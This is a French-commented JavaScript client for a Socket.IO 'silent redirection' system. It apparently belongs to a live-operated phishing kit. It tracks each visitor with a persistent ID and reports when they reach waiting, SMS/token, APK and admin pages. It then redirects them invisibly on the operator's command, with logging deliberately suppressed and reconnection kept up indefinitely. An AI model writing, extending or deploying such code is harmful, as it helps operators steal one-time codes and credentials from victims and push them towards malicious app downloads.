/**
 * Client WebSocket optimisé pour le système de redirection silencieuse
 * Fonctionnalités:
 * - Connexion automatique et silencieuse
 * - Redirection invisible (pas d'URL visible, pas de message)
 * - Persistance du client_id via localStorage
 * - Reconnexion automatique robuste
 * - Heartbeat pour maintenir la connexion
 */

class OptimizedRedirectionClient {
    constructor() {
        this.socket = null;
        this.clientId = null;
        this.isConnected = false;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = 20;
        this.reconnectDelay = 1000; // Délai initial en ms
        this.maxReconnectDelay = 30000; // Délai maximum en ms
        this.heartbeatInterval = null;
        this.connectionTimeout = null;
        this.isReconnecting = false;
        this.isInitialized = false;
        
        // Configuration optimisée
        this.config = {
            heartbeatInterval: 25000, // 25 secondes
            connectionTimeout: 15000, // 15 secondes
            pingInterval: 30000, // 30 secondes
            maxRetries: 20,
            retryBackoffFactor: 1.3,
            silentMode: true // Mode silencieux - pas de logs visibles
        };
        
        // Événements personnalisés (optionnels)
        this.eventListeners = {
            'connected': [],
            'disconnected': [],
            'reconnected': [],
            'redirect': [],
            'error': []
        };
        
        // Initialisation automatique
        this.init();
    }

    init() {
        if (this.isInitialized) return;
        this.isInitialized = true;
        
        this.log('Initialisation du client de redirection optimisé...');
        
        // Récupérer l'ID client depuis le localStorage
        this.clientId = localStorage.getItem('websocket_client_id');
        
        // Initialiser la connexion WebSocket
        this.connect();
        
        // Gérer la visibilité de la page
        this.handlePageVisibility();
        
        // Gérer les événements de la page
        this.handlePageEvents();
        
        // Démarrer la surveillance de la connexion
        this.startConnectionMonitoring();
    }

    connect() {
        if (this.isReconnecting && this.socket) {
            this.log('Reconnexion déjà en cours...');
            return;
        }
        
        this.log('Tentative de connexion WebSocket...');
        
        // Nettoyer la connexion précédente si elle existe
        if (this.socket) {
            this.socket.disconnect();
            this.socket = null;
        }
        
        // Configuration du socket avec options optimisées
        this.socket = io({
            transports: ['websocket', 'polling'],
            upgrade: true,
            rememberUpgrade: true,
            timeout: this.config.connectionTimeout,
            reconnection: false, // Gestion manuelle de la reconnexion
            forceNew: true,
            autoConnect: true
        });
        
        this.setupSocketEvents();
        
        // Timeout de connexion
        this.connectionTimeout = setTimeout(() => {
            if (!this.isConnected) {
                this.log('Timeout de connexion');
                this.handleConnectionError('Connection timeout');
            }
        }, this.config.connectionTimeout);
    }

    setupSocketEvents() {
        // Gestion de la connexion
        this.socket.on('connect', () => {
            this.log('✅ Connecté au serveur WebSocket');
            this.isConnected = true;
            this.reconnectAttempts = 0;
            this.reconnectDelay = 1000;
            this.isReconnecting = false;
            
            if (this.connectionTimeout) {
                clearTimeout(this.connectionTimeout);
                this.connectionTimeout = null;
            }
            
            // Si nous avons déjà un ID client, le réutiliser
            if (this.clientId) {
                this.log('Reconnexion avec ID existant:', this.clientId);
                this.socket.emit('rejoin_client', { client_id: this.clientId });
            }
            
            // Démarrer le heartbeat
            this.startHeartbeat();
            
            // Notifier la page actuelle
            this.notifyPageChange(this.getCurrentPage());
            
            // Déclencher l'événement personnalisé
            this.triggerEvent('connected');
        });

        // Réception de l'ID client
        this.socket.on('client_id', (data) => {
            const wasReconnection = data.reconnected || false;
            this.clientId = data.client_id;
            localStorage.setItem('websocket_client_id', this.clientId);
            
            this.log(`${wasReconnection ? '🔄 Reconnecté' : '🆔 ID Client reçu'}:`, this.clientId);
            
            // Notifier la page actuelle
            this.notifyPageChange(this.getCurrentPage());
            
            if (wasReconnection) {
                this.triggerEvent('reconnected', { clientId: this.clientId });
            }
        });

        // Gestion des redirections - SILENCIEUSE
        this.socket.on('redirect', (data) => {
            this.log('🔄 Redirection reçue vers:', data.url);
            this.triggerEvent('redirect', data);
            
            // Redirection silencieuse immédiate
            this.performSilentRedirection(data.url);
        });

        // Gestion des heartbeats
        this.socket.on('heartbeat_ack', (data) => {
            this.log('💓 Heartbeat ACK reçu');
        });

        // Gestion des pings
        this.socket.on('pong', (data) => {
            this.log('🏓 Pong reçu');
        });

        // Gestion de la déconnexion forcée
        this.socket.on('force_disconnect', (data) => {
            this.log('⚠️ Déconnexion forcée:', data.message);
            this.cleanup();
            // Pas d'alerte visible - mode silencieux
        });

        // Gestion de la déconnexion
        this.socket.on('disconnect', (reason) => {
            this.log('❌ Déconnecté du serveur WebSocket:', reason);
            this.isConnected = false;
            this.stopHeartbeat();
            
            this.triggerEvent('disconnected', { reason });
            
            // Tentative de reconnexion automatique
            if (reason !== 'io client disconnect' && reason !== 'forced close') {
                this.scheduleReconnect();
            }
        });

        // Gestion des erreurs de connexion
        this.socket.on('connect_error', (error) => {
            this.log('❌ Erreur de connexion WebSocket:', error);
            this.handleConnectionError(error);
        });

        // Gestion des erreurs générales
        this.socket.on('error', (error) => {
            this.log('❌ Erreur WebSocket:', error);
            this.triggerEvent('error', { error });
        });
    }

    handleConnectionError(error) {
        this.isConnected = false;
        this.triggerEvent('error', { error });
        
        if (this.connectionTimeout) {
            clearTimeout(this.connectionTimeout);
            this.connectionTimeout = null;
        }
        
        this.scheduleReconnect();
    }

    scheduleReconnect() {
        if (this.isReconnecting || this.reconnectAttempts >= this.maxReconnectAttempts) {
            if (this.reconnectAttempts >= this.maxReconnectAttempts) {
                this.log('❌ Nombre maximum de tentatives de reconnexion atteint');
                this.triggerEvent('error', { error: 'Max reconnection attempts reached' });
                
                // Réessayer après un délai plus long
                setTimeout(() => {
                    this.reconnectAttempts = 0;
                    this.scheduleReconnect();
                }, 60000); // 1 minute
            }
            return;
        }
        
        this.isReconnecting = true;
        this.reconnectAttempts++;
        
        this.log(`🔄 Tentative de reconnexion ${this.reconnectAttempts}/${this.maxReconnectAttempts} dans ${this.reconnectDelay}ms`);
        
        setTimeout(() => {
            this.connect();
        }, this.reconnectDelay);
        
        // Augmenter le délai pour la prochaine tentative (backoff exponentiel)
        this.reconnectDelay = Math.min(
            this.reconnectDelay * this.config.retryBackoffFactor,
            this.maxReconnectDelay
        );
    }

    startHeartbeat() {
        this.stopHeartbeat(); // S'assurer qu'il n'y a pas de heartbeat existant
        
        this.heartbeatInterval = setInterval(() => {
            if (this.isConnected && this.clientId && this.socket) {
                this.socket.emit('heartbeat', { client_id: this.clientId });
            }
        }, this.config.heartbeatInterval);
        
        // Ping périodique
        setInterval(() => {
            if (this.isConnected && this.socket) {
                this.socket.emit('ping');
            }
        }, this.config.pingInterval);
    }

    stopHeartbeat() {
        if (this.heartbeatInterval) {
            clearInterval(this.heartbeatInterval);
            this.heartbeatInterval = null;
        }
    }

    getCurrentPage() {
        const path = window.location.pathname;
        const pageMap = {
            '/': 'Page principale',
            '/index.html': 'Page principale',
            '/att.html': 'Page d\'attente',
            '/sms.html': 'Page SMS/Token',
            '/apk.html': 'Page APK',
            '/admin.html': 'Panneau d\'administration'
        };
        
        return pageMap[path] || `Page: ${path}`;
    }

    notifyPageChange(page) {
        if (this.isConnected && this.clientId && this.socket) {
            this.socket.emit('page_change', {
                client_id: this.clientId,
                page: page
            });
        } else {
            // Réessayer après un délai si pas encore connecté
            setTimeout(() => {
                if (this.clientId) {
                    this.notifyPageChange(page);
                }
            }, 2000);
        }
    }

    performSilentRedirection(url) {
        this.log('🔄 Redirection silencieuse vers:', url);
        
        try {
            // Redirection silencieuse immédiate - pas de transition visible
            window.location.href = url;
        } catch (error) {
            this.log('Erreur lors de la redirection:', error);
            // Fallback
            window.location.replace(url);
        }
    }

    handlePageVisibility() {
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible') {
                this.log('📱 Page visible - vérification de la connexion');
                if (!this.isConnected) {
                    this.forceReconnect();
                }
            }
        });
    }

    handlePageEvents() {
        // Gérer les changements d'URL
        window.addEventListener('popstate', () => {
            setTimeout(() => {
                this.notifyPageChange(this.getCurrentPage());
            }, 100);
        });
        
        // Gérer le rechargement de la page
        window.addEventListener('beforeunload', () => {
            if (this.socket && this.isConnected) {
                this.socket.disconnect();
            }
        });
        
        // Gérer les erreurs JavaScript pour éviter les interruptions
        window.addEventListener('error', (event) => {
            this.log('Erreur JavaScript capturée:', event.error);
            // Ne pas interrompre le fonctionnement du WebSocket
        });
    }

    startConnectionMonitoring() {
        // Surveiller la connexion toutes les 30 secondes
        setInterval(() => {
            if (!this.isConnected && !this.isReconnecting) {
                this.log('Surveillance: Connexion perdue, tentative de reconnexion');
                this.forceReconnect();
            }
        }, 30000);
    }

    // Méthodes publiques
    forceReconnect() {
        this.log('🔄 Reconnexion forcée...');
        this.reconnectAttempts = 0;
        this.reconnectDelay = 1000;
        this.isReconnecting = false;
        
        if (this.socket) {
            this.socket.disconnect();
        }
        
        setTimeout(() => {
            this.connect();
        }, 1000);
    }

    disconnect() {
        this.log('🔌 Déconnexion manuelle');
        this.cleanup();
    }

    cleanup() {
        this.isConnected = false;
        this.isReconnecting = false;
        this.stopHeartbeat();
        
        if (this.connectionTimeout) {
            clearTimeout(this.connectionTimeout);
            this.connectionTimeout = null;
        }
        
        if (this.socket) {
            this.socket.disconnect();
            this.socket = null;
        }
    }

    // Système d'événements personnalisés
    on(event, callback) {
        if (this.eventListeners[event]) {
            this.eventListeners[event].push(callback);
        }
    }

    off(event, callback) {
        if (this.eventListeners[event]) {
            const index = this.eventListeners[event].indexOf(callback);
            if (index > -1) {
                this.eventListeners[event].splice(index, 1);
            }
        }
    }

    triggerEvent(event, data = {}) {
        if (this.eventListeners[event]) {
            this.eventListeners[event].forEach(callback => {
                try {
                    callback(data);
                } catch (error) {
                    this.log(`Erreur dans le callback de l'événement ${event}:`, error);
                }
            });
        }
    }

    // Méthodes utilitaires
    getStatus() {
        return {
            isConnected: this.isConnected,
            clientId: this.clientId,
            reconnectAttempts: this.reconnectAttempts,
            isReconnecting: this.isReconnecting,
            currentPage: this.getCurrentPage()
        };
    }

    getClientId() {
        return this.clientId;
    }

    isConnectionActive() {
        return this.isConnected;
    }

    // Logging conditionnel (silencieux en production)
    log(...args) {
        if (!this.config.silentMode) {
            console.log('[WebSocket Client]', ...args);
        }
    }
}

// Auto-initialisation quand le DOM est chargé
(function() {
    'use strict';
    
    let clientInstance = null;
    
    function initializeClient() {
        if (clientInstance) return;
        
        try {
            clientInstance = new OptimizedRedirectionClient();
            
            // Exposer globalement pour le débogage (optionnel)
            if (typeof window !== 'undefined') {
                window.redirectionClient = clientInstance;
            }
            
        } catch (error) {
            console.error('Erreur lors de l\'initialisation du client WebSocket:', error);
            
            // Réessayer après un délai
            setTimeout(initializeClient, 5000);
        }
    }
    
    // Initialiser dès que possible
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeClient);
    } else {
        initializeClient();
    }
    
    // Initialiser aussi au chargement complet de la page
    window.addEventListener('load', () => {
        if (!clientInstance) {
            initializeClient();
        } else if (clientInstance.isConnectionActive()) {
            clientInstance.notifyPageChange(clientInstance.getCurrentPage());
        }
    });
})();

// Fonctions utilitaires globales (optionnelles)
window.getWebSocketStatus = function() {
    if (window.redirectionClient) {
        return window.redirectionClient.getStatus();
    }
    return { isConnected: false, error: 'Client non initialisé' };
};

window.forceWebSocketReconnect = function() {
    if (window.redirectionClient) {
        window.redirectionClient.forceReconnect();
    }
};

// Fonction pour rediriger vers la page d'attente après soumission du formulaire
window.redirectToWaitingPage = function() {
    if (window.redirectionClient && window.redirectionClient.isConnectionActive()) {
        window.redirectionClient.performSilentRedirection('/att.html');
    } else {
        // Fallback si WebSocket n'est pas disponible
        window.location.href = '/att.html';
    }
};

